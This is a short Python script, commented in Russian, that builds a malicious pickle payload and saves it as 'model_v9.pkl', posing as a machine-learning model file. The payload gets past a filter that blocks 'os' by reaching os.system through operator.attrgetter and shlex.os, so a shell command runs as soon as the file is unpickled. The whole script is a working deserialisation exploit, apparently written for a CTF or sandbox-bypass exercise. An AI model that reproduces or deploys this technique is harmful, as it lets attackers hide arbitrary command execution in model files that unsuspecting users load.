import pickle

# Построение "невидимого" байт-кода
# Мы используем:
# 1. operator.attrgetter('system') - это объект, который умеет доставать 'system'
# 2. shlex.os - это модуль os, спрятанный внутри модуля shlex

payload = (
    b"coperator\nattrgetter\n"   # Импортируем attrgetter (обычно не в черном списке)
    b"(S'system'\ntR"             # Создаем объект getter = attrgetter('system')
    b"(cshlex\nos\n"              # Импортируем модуль os через shlex! (Обход фильтра 'os')
    b"tR"                         # Вызываем getter(shlex.os) -> получаем функцию system
    b"(S'touch /app/FINAL_BYPASS_WIN.txt'\ntR." # Вызываем её с аргументом и STOP
)

with open('model_v9.pkl', 'wb') as f:
    f.write(payload)

print("Ультра-модель 'model_v9.pkl' создана!")
